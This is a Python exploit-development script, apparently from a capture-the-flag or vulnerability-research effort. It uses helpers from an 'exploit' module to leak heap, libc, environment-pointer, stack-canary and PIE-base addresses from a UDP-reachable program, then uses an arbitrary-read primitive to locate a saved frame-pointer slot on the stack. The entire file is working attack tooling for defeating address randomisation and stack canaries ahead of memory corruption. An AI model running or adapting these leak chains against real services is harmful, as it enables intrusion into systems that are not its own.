#!/usr/bin/env python3

from exploit import (
    ENVIRON,
    IO_FILE_JUMPS,
    REQUEST_DELTA,
    get_udp_port,
    make_udp,
    leak_heap,
    leak_ptr,
    leak_canary_from_auxv,
    arb_read,
)


def qword(b):
    return int.from_bytes(b.ljust(8, b"\x00"), "little")


def main():
    io, udp_port = get_udp_port()
    sock = make_udp(io)

    heap_base = leak_heap(sock, udp_port)
    request = heap_base + REQUEST_DELTA
    filep = leak_ptr(sock, udp_port, request + 0x110)
    libc_base = leak_ptr(sock, udp_port, filep + 0xD8) - IO_FILE_JUMPS
    envp = leak_ptr(sock, udp_port, libc_base + ENVIRON)
    auxv = leak_canary_from_auxv(sock, udp_port, envp)
    pie_base = auxv["at_phdr"] - 0x40 if auxv["at_phdr"] else 0

    start = envp - 0x200
    blob = arb_read(sock, udp_port, start, 0x300)
    print(f"heap_base=0x{heap_base:x}")
    print(f"request=0x{request:x}")
    print(f"libc_base=0x{libc_base:x}")
    print(f"envp=0x{envp:x}")
    print(f"canary=0x{auxv['canary']:016x}")
    print(f"pie_base=0x{pie_base:x}")
    target = pie_base + 0x9F00
    print(f"saved_rbp_target=0x{target:x}")
    hits = []
    for off in range(0, len(blob), 8):
        val = qword(blob[off:off + 8])
        if val == target:
            hits.append(start + off)
    print(f"hits={','.join(hex(x) for x in hits) if hits else 'none'}")
    for base in hits:
        around = base - 0x20
        data = arb_read(sock, udp_port, around, 0x60)
        for off in range(0, len(data), 8):
            val = qword(data[off:off + 8])
            mark = ""
            if around + off == base:
                mark = " <== saved rbp slot"
            print(f"0x{around+off:016x}: 0x{val:016x}{mark}")

    io.close()
    sock.close()


if __name__ == "__main__":
    main()
